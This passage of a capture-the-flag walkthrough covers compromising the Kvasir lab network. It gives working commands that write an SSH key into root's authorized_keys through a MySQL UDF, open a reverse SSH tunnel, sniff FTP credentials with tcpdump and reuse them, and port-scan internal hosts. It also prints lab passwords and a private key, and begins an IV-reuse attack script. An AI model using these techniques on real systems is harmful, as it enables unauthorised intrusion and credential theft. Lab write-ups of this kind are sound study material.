cat ~/.ssh/id_rsa.pub &gt;&gt; payload
echo "' INTO OUTFILE \"/root/.ssh/authorized_keys\"; " &gt;&gt; payload
echo "SELECT sys_exec(\"chmod 600 /root/.ssh/authorized_keys\"); " &gt;&gt; payload

cat payload | tr -d '\n' &gt; payload2
rm payload
mv payload2 payload

mysql -h 127.0.0.1 -P 13333 -u root -pcoolwater &lt; payload
</code></pre>

<p><code>lib_mysql_udf</code> was compiled like so:</p>

<pre><code class="bash">$ git clone https://github.com/mysqludf/lib_mysqludf_sys
$ gcc -fPIC -Wall -I/usr/include/mysql -I. -shared lib_mysqludf_sys.c -o ./lib_mysqludf_sys.so
</code></pre>

<p>The exploit uses <code>INTO DUMPFILE</code> and not <code>INTO OUTFILE</code> because the latter mangled the file. Running the exploit:</p>

<pre><code>bas@tritonal:~/tools/lib_mysqludf_sys$ bash ./exploit.sh
sys_exec("chmod 600 /root/.ssh/authorized_keys")
0
</code></pre>

<p>Sweet. I should now be able to login via ssh. Enabling the ssh tunnel on <code>192.168.1.100</code>:</p>

<pre><code class="bash">ssh -fN -R 2222:192.168.2.200:22 bas@10.8.7.1 -o StrictHostKeyChecking=no -i /tmp/bas 2&gt;&amp;1
</code></pre>

<p>And then on my own box:</p>

<pre><code>bas@tritonal:~$ ssh root@localhost -p 2222
The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.
ECDSA key fingerprint is 28:a1:7b:9c:cb:bc:aa:23:02:e1:e8:29:a0:c0:31:b8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[localhost]:2222' (ECDSA) to the list of known hosts.
Linux db 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Sep 27 21:23:54 2014
root@db:~# 
</code></pre>

<p>Success! But this isn&rsquo;t the end of Kvasir, not by a long shot&hellip;</p>

<p><img src="/assets/kvasir/05.jpg" alt="" /></p>

<p>Enumerating the home directory shows <code>.words.txt</code>, which is needed later. Obviously, <code>flag</code> is a troll :]</p>

<pre><code>root@db:~# ls -alh
total 32K
drwx------  4 root root 4.0K Sep 27 21:24 .
drwxr-xr-x 22 root root 4.0K Aug  9 15:38 ..
drwx------  2 root root 4.0K Aug  9 22:57 .aptitude
-rw-------  1 root root    0 Sep 27 21:33 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root   46 Sep 27 21:24 flag
-rw-------  1 root root    0 Sep  4 13:30 .mysql_history
-rw-------  1 root root    0 Sep 27 21:34 .nano_history
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
drwxr-xr-x  2 root root 4.0K Nov  3 19:21 .ssh
-rw-------  1 root root    0 Sep 27 21:33 .viminfo
-rw-r--r--  1 root root 1.1K Aug 10 11:09 .words.txt
root@db:~# ifconfig
eth0      Link encap:Ethernet  HWaddr 1e:13:fc:ff:a9:6a  
          inet addr:192.168.2.200  Bcast:192.168.2.255  Mask:255.255.255.0
          inet6 addr: fe80::1c13:fcff:feff:a96a/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:614 errors:0 dropped:0 overruns:0 frame:0
          TX packets:413 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:81688 (79.7 KiB)  TX bytes:54254 (52.9 KiB)

eth1      Link encap:Ethernet  HWaddr ba:f4:f7:a6:a2:35  
          inet addr:192.168.3.200  Bcast:192.168.3.255  Mask:255.255.255.0
          inet6 addr: fe80::b8f4:f7ff:fea6:a235/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:262 errors:0 dropped:0 overruns:0 frame:0
          TX packets:168 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:32269 (31.5 KiB)  TX bytes:32485 (31.7 KiB)
</code></pre>

<p>Again, another NIC. Also, pure-ftpd is running on this box. After playing around, I found this:</p>

<pre><code class="bash">root@db:~# cat /etc/pure-ftpd/pureftpd.passwd
celes:$1$LwZNkFH0$8rq4AbiYLXkfSMPXB1psV/:1000:1000::/var/log/./::::::::::::
</code></pre>

<p>But the hash seems uncrackable. So there is a valid user to log into this pure-ftpd server, but <code>celes</code> is not a user on this box&hellip; So maybe a user from another box?! I ran tcpdump and whadda-ya-know:</p>

<pre><code>root@db:~# tcpdump -i eth1 -vvv -A
tcpdump: listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
19:33:01.238481 IP (tos 0x0, ttl 64, id 60394, offset 0, flags [DF], proto TCP (6), length 60)
    192.168.3.40.56746 &gt; 192.168.3.200.ftp: Flags [S], cksum 0x64c5 (correct), seq 1344587505, win 14600, options [mss 1460,sackOK,TS val 208155 ecr 0,nop,wscale 5], length 0
E..&lt;..@.@......(........P$........9.d..........
..-.........
19:33:01.238872 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 60)
    192.168.3.200.ftp &gt; 192.168.3.40.56746: Flags [S.], cksum 0x886f (incorrect -&gt; 0x70f4), seq 2494575209, ack 1344587506, win 14480, options [mss 1460,sackOK,TS val 208155 ecr 208155,nop,wscale 5], length 0
E..&lt;..@.@..{.......(......2iP$....8..o.........
..-...-.....
19:33:01.239764 IP (tos 0x0, ttl 64, id 60395, offset 0, flags [DF], proto TCP (6), length 52)
    192.168.3.40.56746 &gt; 192.168.3.200.ftp: Flags [.], cksum 0xd684 (correct), seq 1, ack 1, win 457, options [nop,nop,TS val 208156 ecr 208155], length 0
E..4..@.@......(........P$....2j...........
..-...-.
19:33:01.273258 IP (tos 0x10, ttl 64, id 8054, offset 0, flags [DF], proto TCP (6), length 372)
    192.168.3.200.ftp &gt; 192.168.3.40.56746: Flags [P.], cksum 0x6f1c (correct), seq 1:321, ack 1, win 453, options [nop,nop,TS val 208164 ecr 208156], length 320
E..t.v@.@..........(......2jP$......o......
..-$..-.220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 50 allowed.
220-Local time is now 19:33. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.

19:33:01.273631 IP (tos 0x0, ttl 64, id 60396, offset 0, flags [DF], proto TCP (6), length 52)
    192.168.3.40.56746 &gt; 192.168.3.200.ftp: Flags [.], cksum 0xd512 (correct), seq 1, ack 321, win 490, options [nop,nop,TS val 208164 ecr 208164], length 0
E..4..@.@......(........P$....3............
..-$..-$
19:33:01.273931 IP (tos 0x0, ttl 64, id 60397, offset 0, flags [DF], proto TCP (6), length 64)
    192.168.3.40.56746 &gt; 192.168.3.200.ftp: Flags [P.], cksum 0x420c (correct), seq 1:13, ack 321, win 490, options [nop,nop,TS val 208164 ecr 208164], length 12
E..@..@.@......(........P$....3.....B......
..-$..-$USER celes

19:33:01.273972 IP (tos 0x10, ttl 64, id 8055, offset 0, flags [DF], proto TCP (6), length 52)
    192.168.3.200.ftp &gt; 192.168.3.40.56746: Flags [.], cksum 0x8867 (incorrect -&gt; 0xd52b), seq 321, ack 13, win 453, options [nop,nop,TS val 208164 ecr 208164], length 0
E..4.w@.@..........(......3.P$.......g.....
..-$..-$
19:33:01.278689 IP (tos 0x10, ttl 64, id 8056, offset 0, flags [DF], proto TCP (6), length 90)
    192.168.3.200.ftp &gt; 192.168.3.40.56746: Flags [P.], cksum 0xd679 (correct), seq 321:359, ack 13, win 453, options [nop,nop,TS val 208165 ecr 208164], length 38
E..Z.x@.@..........(......3.P$.......y.....
..-%..-$331 User celes OK. Password required

19:33:01.278954 IP (tos 0x0, ttl 64, id 60398, offset 0, flags [DF], proto TCP (6), length 71)
    192.168.3.40.56746 &gt; 192.168.3.200.ftp: Flags [P.], cksum 0x3986 (correct), seq 13:32, ack 359, win 490, options [nop,nop,TS val 208166 ecr 208165], length 19
E..G..@.@......(........P$....3.....9......
..-&amp;..-%PASS im22BF4HXn01
</code></pre>

<p>What the heck? Someone, or <em>something</em>, is accessing the ftp server. This yields the credentials <code>celes:im22BF4HXn01</code>. Maybe there is some password re-use going on?</p>

<pre><code>root@db:~# ssh celes@192.168.3.40
The authenticity of host '192.168.3.40 (192.168.3.40)' can't be established.
ECDSA key fingerprint is 28:a1:7b:9c:cb:bc:aa:23:02:e1:e8:29:a0:c0:31:b8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.3.40' (ECDSA) to the list of known hosts.
celes@192.168.3.40's password: 
Linux dev1 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Thu Sep  4 09:20:00 2014
celes@dev1:~$ ls -al
total 136
drwxr-xr-x 3 celes celes   4096 Sep  3 22:16 .
drwxr-xr-x 3 root  root    4096 Aug  9 23:20 ..
-rw------- 1 celes celes     14 Sep  4 09:16 .bash_history
-rw-r--r-- 1 celes celes    220 Dec 30  2012 .bash_logout
-rw-r--r-- 1 celes celes   3392 Dec 30  2012 .bashrc
-rwxr-xr-x 1 celes celes    178 Sep 27 21:29 getLogs.py
-rw-r--r-- 1 celes celes 104613 Sep  3 22:16 kvasir.png
-rw-r--r-- 1 celes celes    675 Dec 30  2012 .profile
drwx------ 2 celes celes   4096 Sep  3 22:06 .ssh
-rw------- 1 celes celes      0 Sep 27 21:35 .viminfo
</code></pre>

<p>Aw yeah! Now I&rsquo;ve entered a third box&hellip; The ftp traffic comes from <code>getLogs.py</code>. Enumerating the box leads to this mail:</p>

<pre><code>celes@dev1:~$ cat /var/mail/celes 
Return-path: &lt;celes@localhost&gt;
Received: from celes by localhost with local (Exim 4.80)
    (envelope-from &lt;celes@localhost&gt;)
    id 1XHczw-0000V2-8y
    for celes@127.0.0.1; Wed, 13 Aug 2014 19:10:08 +0100
Date: Wed, 13 Aug 2014 19:10:08 +0100
To: celes@127.0.0.1
Subject: Reminder
User-Agent: Heirloom mailx 12.5 6/20/10
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-Id: &lt;E1XHczw-0000V2-8y@localhost&gt;
From: celes@localhost

Terra sent me kvasir.png and challenged me to solve the stupid little puzzle she has running on her machine... *sigh*
</code></pre>

<p>OK, let&rsquo;s have a close look at <code>kvasir.png</code>.</p>

<p><img src="/assets/kvasir/kvasir.png" alt="" /></p>

<p>Haha, loving the Stargate reference :) I smell stego! I tried a few programs, like <code>outguess</code> and <code>steghide</code>, but <code>stepic</code> did the trick:</p>

<pre><code class="bash">bas@tritonal:~/tmp$ stepic -d -i kvasir.png
89504e470d0a1a0a0000000d494844520000012200000122010300000067704df500000006504c5445ffffff00000055c2d37e00000104494441540899ed98c90dc32010459152804b72eb2ec9054422304bc089655f180ec9fb0730f07cfa9a0552420821f43fcaa6674aeb5e96dbe23b1b5434a58be559bf1e59befa03a848aa5ab22de690f2d530a8895473086a365500e7a1265132b5b3bbfc05358e7a57640b919bba0d358eeab55c9c418da7cc0df1a576a2792fa561ad035434a5920b808588d974e215d4584acff4065626ffe9db47a8e194eec805a00d7621830aa6acffd40c95d5a6fa27d404cae555e13475410550e6cca113ed72145424a56ee8ab4f8989ecb5196a02d5bdfa2477e83333410553d97ba093cc04154c89a439ba880ea881944c2d3aea0a6a0e75acc8528c4550e1144208a15fd70b88df9bb4ae0a3dc20000000049454e44ae426082
</code></pre>

<p>Huh? What&rsquo;s this then?</p>

<pre><code class="bash">bas@tritonal:~/tmp$ stepic -d -i kvasir.png | xxd -r -p &gt; new    
bas@tritonal:~/tmp$ file new    
new: PNG image data, 290 x 290, 1-bit colormap, non-interlaced
</code></pre>

<p>PNG in a PNG. We need to go <em>deeper</em>&hellip;</p>

<p><img src="/assets/kvasir/06.png" alt="" /></p>

<p>Ah! This QR code decodes to <code>Nk9yY31hva8q</code>. Could this be terra&rsquo;s password? And where exactly is terra? I wrote a small python script to scan for other ip addresses and sure enough, it found <code>192.168.3.50</code>:</p>

<pre><code class="bash">celes@dev1:~$ ssh terra@192.168.3.50
The authenticity of host '192.168.3.50 (192.168.3.50)' can't be established.
ECDSA key fingerprint is 28:a1:7b:9c:cb:bc:aa:23:02:e1:e8:29:a0:c0:31:b8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.3.50' (ECDSA) to the list of known hosts.
terra@192.168.3.50's password: 
Permission denied, please try again.
terra@192.168.3.50's password: 
Permission denied, please try again.
terra@192.168.3.50's password: 

celes@dev1:~$
</code></pre>

<p>FAIL. That didn&rsquo;t work. But the mail said something about a game? I modified a small portscanner in python (taken from <a href="http://www.pythonforpentesting.com/2013/10/port-scanning-with-python.html">here and modified</a>):</p>

<pre><code class="python">#!/usr/bin/python

from socket import *
import sys

def conn(host, port):
    try:
        s = socket(AF_INET, SOCK_STREAM) # TCP scan 
        s.connect((host, port))
        return s
    except:
        return None

def scan(host, port):
    sock = conn(host, port)
    #setdefaulttimeout(1)
    if sock:
        print("[+] port %d: open") % port

if __name__=="__main__":
    print "[!] starting..."
    if sys.argv[1]:
        print "[!] scanning %s" % sys.argv[1]
        for i in range(65535):
            scan(sys.argv[1], int(i))
</code></pre>

<p>Which obviously isn&rsquo;t efficient as:</p>

<pre><code class="bash">celes@dev1:~$ for i in `seq 1 65535`; do nc -z -v 192.168.3.50 $i 2&gt;&amp;1 | grep 'open'; done
(UNKNOWN) [192.168.3.50] 22 (ssh) open
(UNKNOWN) [192.168.3.50] 1194 (openvpn) : Connection refused
(UNKNOWN) [192.168.3.50] 4444 (?) open
</code></pre>

<p>Let&rsquo;s see what <code>4444</code> has to offer.</p>

<pre><code class="bash">celes@dev1:~$ nc 192.168.3.50 4444
Hello Celes &amp; Welcome to the Jumble!

Solve:lrbgaaue 
Solve:iahdtsing 
Solve:yelpslfrciaiu 
Solve:nduyn 
Solve:etrdar 
Solve:oneantctg 
Solve:cnuaditdci 
Solve:yhpeltloyipr 
</code></pre>

<p>Right! This is where I needed <code>.words.txt</code>. The words have been jumbled and we need to return the right words. I wrote a python script for that:</p>

<pre><code class="python">#!/usr/bin/python
from socket import *

wordfile = open("word", "r")
words = wordfile.readlines()
wordfile.close()

lookup = {}

for word in words:
        word = word.strip()
        sortedword = ''.join(sorted(word))
        lookup[sortedword] = word

s = socket(AF_INET, SOCK_STREAM)
s.connect(("192.168.3.50", int(4444)))

keepgoing = 1
while (keepgoing):
        c = s.recv(256)
        print c
        if "Solve" in c:
                challenge = c.split(":")[1].strip()
                w = ''.join(sorted(challenge))
                s.send(lookup[w])
                print lookup[w]

raw_input()
# done
s.close()
</code></pre>

<p>There are a couple of funny entries in the wordlist by the way :) Have a look for yourself!</p>

<pre><code class="bash">celes@dev1:~$ python ./solve.py |more
Hello Celes &amp; Welcome to the Jumble!

Solve:natlpaearenp 
Solve:setmeiercs 
Solve:harten 
Solve:keasmijnopur 
Solve:utefaldzsi 
Solve:rlirpaeot 
Solve:radret 
Solve:ebddnriug 
Solve:ludacide 
Solve:tdtorheiecc 
Solve:vihnac 
Solve:dfohyrlnedea 
Solve:paisrellufyci 
Solve:vnhmrotiunesep 
Solve:nrerslemgio 
Solve:louficmumr 
Solve:ik0mtg1 
Solve:mgcaprteiotbn 
Solve:snsrsdoeis 
Solve:hrssnoeism 
Solve:dsfzlateui 
Solve:rereenupcs 
Solve:mhguespiop 
Solve:oipgtcebharae 
Solve:jnrpiumkseoa 
Solve:iramca 
Solve:iigatdsnh 
Solve:kmaigiir 
Solve:uwhenohgr 
Solve:terdar 
Solve:rlogacpihgo 
Solve:strrpaeer 
Solve:sckajbu 
Solve:btirhmasin 
Solve:bnbghlioo 
Solve:litudseafz 
Solve:aukripmejnso 
Solve:onvmtideinea 
Solve:tieabrhacgpeo 
Solve:rprsartee 
Solve:ernaht 
Solve:gplosedcoi 
Solve:suzeth 
Solve:pgghcilaoro 
Solve:ht3cke 
Solve:hlbonoibg 
Solve:tdrare 
Solve:ryud 
Solve:radem 
Solve:wnuergohh 
Solve:rltianuysietv 
Solve:dlzuieatsf 
Solve:mortiacnae 
Solve:tueddnpue 
Solve:unynd 
Solve:ifumrcouml 
Solve:auaeglrb 
Solve:cetrmpogiatnb 
Solve:idiastssa 
Solve:italiernuyvst 

Score: 120
Time: 0.01 secs
You're a winner
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRFSy1
JbmZvOiBBRVMtMTI4LUNCQyw3Njg0MTgyMkFCOUU3NzJGRDFENjUzRjYxNzlGMEU0RAoKT3JFTTJvY2
5oSEtnNW51SDdwczFDb09KQ2loYXNtRkpLTE9WTk5ZRk9oR0tVb2pQ
WUV0YTV5T2hJc2tmMGgwcgpTbyt4VkRLNjdHM0RsZ3ltVVYzRHhHZml6TGZadmh4UVJDOFF5MG1mNE4
rbWlZa3ZmMk5hRnRhdHBOY2pLNXBNClV5NlFTRk1PQzhhS3BlMEZMNlVHRFJKUTVHU0c0RGxKckxVSk
JNdm5TTHRZWkhsYVdBSUNLYlhmcFhWNFNUd3YKSjBEOGg5UnRsUkpoTENLNWVLZ3VwWUNRSWlHUVdnM
1B2WnBYazlra2pYaG1P
UXdVWW9DUmwzbDRqNXpsbkZjVApQNlU5VVBoUnEvQ2s0UXJrMmRHeEZmcHBRZDl4VytiNFBXamlTQ2l
rTEYzUTBoZk5OdkVidTRvdW5BZ1l3UEZICmpPWEhKcXhWb2cvcFp6OVk4WGZTUDNoejlBWUhXZkkyaU
M5Q25rN2JvUmNPdittY2dFZVdXa1lyVnNjT2l2WWoKOU4yeGlOcDRHSCtOSUc4bW0vTGRsN2pRTWwvV
nJyNWN4M2ZYak9lem1n
c1NrQVk0Q2NzcHdLc1NYSzhHTC9iTwpoVDZwS1dmTDZVSTh3VWdwSTdLaGdLK0FPS3VTL1hQWVRTZHo
rMFJKeE5GU0xPRk5jalJ0TCtOVzBValBxNUpoCkRpYStwdzVxQitsbGx4Z2FOMFdCUXNrSUZRcHBwUG
93d2pHOEpnOGpKQmpTWWozcjRMSXJad0pTcGN2b0JpVUEKb0NxblFVTXRYbE1oOS9DdkJCR3MxK0pWY
2prSW5CZGU5NDVWK2Vq
aFA2R1BZanU0VFFWN0I3MGQ3YUVXME9FbQowZDduck9XL0xDWXBzVi9ONXJxVnNHbFR2d2pKTm93eU1
xRVo5RTA5Z3VNNWVMNENFUFBtcDlaRGV5MmZCQUd3CnE3blNyOHE2SHNmNGQrWVBSKzkwRWZNSlJlcU
kzczFGUW9UdngrUGFGUGlLdzdkZkhGQ2dMc2NYY1hjb2duTHoKY0IwbG5lbUkrY0ZtZlk3NEYxZVlMM
2Z3Skl3U1JnSzg1WGMy
TXk4c3FKejFpemo2SWxPMmtRMWpMa3JoSk9aOApYK3AvOXc1ekEweDJmYmpwcEhhYytZb0pmeVB5WVh
qa3BpZ0RQakhYaFJpdDJxblVySGZEYzBGamg1QUtOVTJLCk1VL3l3WEdFZzZ3MENwcEs5SkJvMHUveE
psaFQvak9XTmlNNFlaalhsaFF6a3h5ZWJ2YnlSUzZTbGhsbzE0MmwKZ011TVV2UG4xZkFlbmlyNkFGd
3kycmxrdFE1L2E4ejJW
Q3dQa05BNDBNSW1TSE1XUlNGYm9Eak01endyMjRHawpOMHBJMUJDbUNzZjBtc3ZFd0xoZGNWbmhKWTd
CZzRpem01YlgrQXJWL3ltTE9reWJLOGNoejVmcnlYY2plVjFxCml6SmUyQVhaazEvOGhZODB0dkpXan
hVRWZuZ3V5b296UWY1VDc0bW41YWV6OUpnR1dNcXpwZkt3WjZMeDVjVGcKWnUrbStyeWFrQlBGalV0d
DA0bENZQ0NLV1F6UGhn
SXI1eFVGeDYyaENHaGg2Vzh0U0lCNms3SHB1bjEyM0dRMAp1VCtSMEVyWUE1R2R5eDQ0RlpFYXRaM3J
YQ3BWbUpsbENUV1VxQnVhSFlBdGNaVGhUVFpmeFJGSHkwMklUNkZXClBMQ1ovWE4yRStUZHRrWG1GY1
RYUnNndHlBLzVWWHNUV1dtUmNIY3p2NWc1WWNRM3BIczNNaFN4c1dTZFR6LzgKUll6bXhPbkNqWldYY
VVlMFhiN0ZqQS9ldm1w
WHN5aENoR2J2cDBLMGhaRmNNZXN6RkthOEs0cEFlZGN5RzMxbgo0K0hoSW1uRXBMWlFPWGhmWGxrS01
RWHJCeXM3aGtvbmtEcDU3VnFoK0lJWkxHelZtZlRWRWoyV2hjLzBZK0dJCkRNcGgwWnZURytKZ3YxTE
8zU2w4MlJ6bTFqVWt6RUlaTkl4WWVTR3JaZjZDaFZMUGE4NWF4cXc1RVZOQ3hZVWcKSkFxZyt1ZDZ4S
U85b2JpZHh6STJyTGZi
eGNwTXVyODBuYjRjcllNTm0wOXlQUWFza25nSy80SWptblBMZVRpaAotLS0tLUVORCBSU0EgUFJJVkF
URSBLRVktLS0tLQo=
</code></pre>

<p>Sweet, a prize! Dumping the prize into a file and decoding it yields an RSA key. Probably the one for terra!</p>

<pre><code>celes@dev1:~$ cat prize |base64 -d &gt; prize.decoded
celes@dev1:~$ file prize.decoded 
prize.decoded: PEM RSA private key
celes@dev1:~$ chmod 600 prize.decoded
celes@dev1:~$ ssh terra@192.168.3.50 -i ./prize.decoded 
Enter passphrase for key './prize.decoded': 
Linux dev2 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Thu Sep  4 09:18:19 2014
terra@dev2:~$ 
</code></pre>

<p>It asks for a passphrase, so I entered <code>Nk9yY31hva8q</code>, recovered from <code>kvasir.jpg</code>. Fourth box! Sure enough, this also will not be the last:</p>

<pre><code class="bash">terra@dev2:~$ /sbin/ifconfig
eth0      Link encap:Ethernet  HWaddr 8e:63:81:fb:49:5d  
          inet addr:192.168.3.50  Bcast:192.168.3.255  Mask:255.255.255.0
          inet6 addr: fe80::8c63:81ff:fefb:495d/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:7811 errors:0 dropped:0 overruns:0 frame:0
          TX packets:7726 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:603633 (589.4 KiB)  TX bytes:460447 (449.6 KiB)

eth1      Link encap:Ethernet  HWaddr de:a7:30:97:c9:7d  
          inet addr:192.168.4.50  Bcast:192.168.4.255  Mask:255.255.255.0
          inet6 addr: fe80::dca7:30ff:fe97:c97d/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:156 errors:0 dropped:0 overruns:0 frame:0
          TX packets:35 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:32315 (31.5 KiB)  TX bytes:2958 (2.8 KiB)
</code></pre>

<p>Looks like there is another host somewhere in <code>192.168.4.1/24</code> waiting for me. After pinging, I found <code>192.168.4.100</code>. A first portscan showed nothing besides the usual, but a second one gave me something:</p>

<pre><code class="bash">terra@dev2:~$ python portscan.py 192.168.4.100
[!] starting...
[!] scanning 192.168.4.100
[+] port 22: open
terra@dev2:~$ python portscan.py 192.168.4.100
[!] starting...
[!] scanning 192.168.4.100
[+] port 22: open
[+] port 1111: open
</code></pre>

<p>Port 1111 is open on the fifth box. Connecting to it seems to yield a shell as <code>locke</code>:</p>

<pre><code class="bash">terra@dev2:~$ nc 192.168.4.100 1111
$ id
uid=1000(locke) gid=1000(locke) groups=1000(locke)
$ whoami
locke
$ cd /home
$ ls -alh
total 16K
drwxr-xr-x  4 root  root  4.0K Aug 13 14:19 .
drwxr-xr-x 22 root  root  4.0K Aug  9 15:38 ..
drwxrwx---  2 kefka kefka 4.0K Sep 27 21:22 kefka
drwxrwx---  2 locke locke 4.0K Sep  4 13:38 locke
cd locke
ls -al
total 352
drwxrwx--- 2 locke locke   4096 Sep  4 13:38 .
drwxr-xr-x 4 root  root    4096 Aug 13 14:19 ..
-rw------- 1 locke locke      0 Sep  4 10:05 .bash_history
-rw-r--r-- 1 locke locke    220 Dec 30  2012 .bash_logout
-rw-r--r-- 1 locke locke   3392 Dec 30  2012 .bashrc
-rw-r--r-- 1 locke locke    675 Dec 30  2012 .profile
-rw------- 1 locke locke      0 Sep 27 21:37 .viminfo
-rw-r--r-- 1 locke locke 329498 Aug 10 10:32 diskimage.tar.gz
-rwxr--r-- 1 locke locke     42 Aug 13 17:59 littleShell.sh
-rw-r--r-- 1 locke locke    110 Sep  4 13:38 note.txt
$ cat note.txt
Looks like Kefka may have been abusing our removable media policy.  I've extracted this image to have a look.
</code></pre>

<p>That <code>diskimage.tar.gz</code> looks interesting. I copied it over to my box and unpacked it. It was, unsurprisingly, a disk image, containing <code>Secret.rar</code>. Furthermore, the disk image seemed to be mostly empty. However, browsing through it using a hex-editor, it had one deleted file! The file looked like it used to be a .WAV file. I recovered it:</p>

<pre><code class="bash">diskimage: x86 boot sector, code offset 0x3c, OEM-ID "MSDOS5.0", sectors/cluster 2, root entries 512, Media descriptor 0xf8, sectors/FAT 238, heads 255, hidden sectors 63, sectors 122031 (volumes &gt; 32 MB) , reserved 0x1, serial number 0xad6f8bf, unlabeled, FAT (16 bit)
root@tritonal:/# mount -t vfat -o loop,ro,noexec diskimage /mnt
root@tritonal:/# cd /mnt
root@tritonal:/mnt# ls
Secret.rar
bas@tritonal:~$ dd if=diskimage of=test.wav bs=1 skip=263168 count=405152
405152+0 records in
405152+0 records out
405152 bytes (405 kB) copied, 1.18141 s, 343 kB/s
bas@tritonal:~$ file test.wav
test.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, stereo 22050 Hz
</code></pre>

<p>It sounded horrible&hellip; yet familiar! I loaded it up in Sonic Visualizer and saw what it sounded like:</p>

<p><img src="/assets/kvasir/07.png" alt="" /></p>

<p>Cool. Looks like it shows another one of those passwords. It&rsquo;s not for <code>kefka</code>, but for <code>Secret.rar</code>:</p>

<pre><code>bas@tritonal:/tmp$ unrar e -pOrcWQi5VhfCo /mnt/Secret.rar

UNRAR 5.00 beta 8 freeware      Copyright (c) 1993-2013 Alexander Roshal


Extracting from /mnt/Secret.rar

Extracting  MyPassword.txt                                            OK 
All OK
bas@tritonal:/tmp$ cat MyPassword.txt 
5224XbG5ki2C
</code></pre>

<p>Now the last one <em>is</em> for kefka!</p>

<pre><code class="bash">terra@dev2:~$ ssh kefka@192.168.4.100 
The authenticity of host '192.168.4.100 (192.168.4.100)' can't be established.
ECDSA key fingerprint is 28:a1:7b:9c:cb:bc:aa:23:02:e1:e8:29:a0:c0:31:b8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.4.100' (ECDSA) to the list of known hosts.
kefka@192.168.4.100's password: 
Linux adm 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Sep 27 20:40:07 2014
kefka@adm:~$ sudo -l
Matching Defaults entries for kefka on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kefka may run the following commands on this host:
    (ALL) NOPASSWD: /opt/wep2.py
</code></pre>

<p>This box is the final hurdle. <code>kefka</code> may run <code>/opt/wep2.py</code> as root. That script is not readable nor writeable. Looks like we need to exploit it:</p>

<pre><code class="bash">kefka@adm:~$ sudo /opt/wep2.py &amp;
[1] 1560
kefka@adm:~$ netstat -ant
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:1234          0.0.0.0:*               LISTEN     
tcp        0      0 192.168.4.100:22        192.168.4.50:34929      ESTABLISHED
tcp6       0      0 :::22                   :::*                    LISTEN     
kefka@adm:~$ nc localhost 1234
=============================
Can you retrieve my secret..?
=============================

Usage:
'V' to view the encrypted flag
'E' to encrypt a plaintext string (e.g. 'E AAAA')

V
89355e:d7172c4f5a691729b8a8cdd4
E AAAA
924ea9:65efc08e
E AAAA
0d2782:98181206
V
305c0c:4255c9f1e049ee1d75b36545
</code></pre>

<p>Combined with the name of this script, it looks like I need to do an attack similar to cracking WEP! I made the following script to do it quickly:</p>

<pre><code class="python">#!/usr/bin/python

from socket import *
from time import *

host = "127.0.0.1"
port = int(1234)

s = socket(AF_INET, SOCK_STREAM)
s.connect((host, port))

keepgoing = 1
# banner
print s.recv(256)

lookup = {} # we are going to build a lookup table for the IV and encrypted secret. 

# this challenge lets us view the encrypted secret and lets us encrypt a message ourselves.
# in doing so, it shows "IV:encrypted message". we'll do a stream cipher re-use style attack.
# we'll build a lookup table with encrypted secret &amp; the corresponding IV
# and if we encounter the same IV for our message, then we can xor the encrypted flag, 
# encrypted message and plaintext message to get the flag (or actually, the secret salt)

while keepgoing:
    s.send("V\n")   # request the encrypted secret
    encryptedKey = s.recv(256).strip()  # grab it
    parts = encryptedKey.split(":") # split &amp; store
    lookup[parts[0]] = parts[1] 

